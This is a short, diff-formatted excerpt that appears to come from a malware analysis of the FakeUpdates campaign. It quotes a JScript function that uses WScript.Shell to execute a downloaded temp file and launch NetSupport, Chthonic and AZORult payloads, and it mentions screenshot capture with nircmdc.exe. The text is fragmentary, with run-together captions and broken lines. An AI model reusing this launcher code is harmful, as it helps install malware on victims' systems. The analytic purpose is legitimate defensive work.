@@ -1,0 +1,4 @@
+
+Code excerpt observed in FakeUpdates used to launch NetSupport payloads function runFile() { var lastException = ''; try { var wsh = new ActiveXObject(\"WScript.
+Shell\"); runFileResult = wsh.
+Run('\"' + _tempFilePathExec + '\"'); lastException = ''; } catch (error) { lastException = error.number; runFileExeption += 'error number:' + error.number + ' message:' + error.message; } } Figure 9: Code excerpt observed in FakeUpdates used to launch Chthonic and AZORult payloads During this process, the victim system downloads and executes nircmdc.exe, a utility specifically used during the infection process to save two system screenshots.
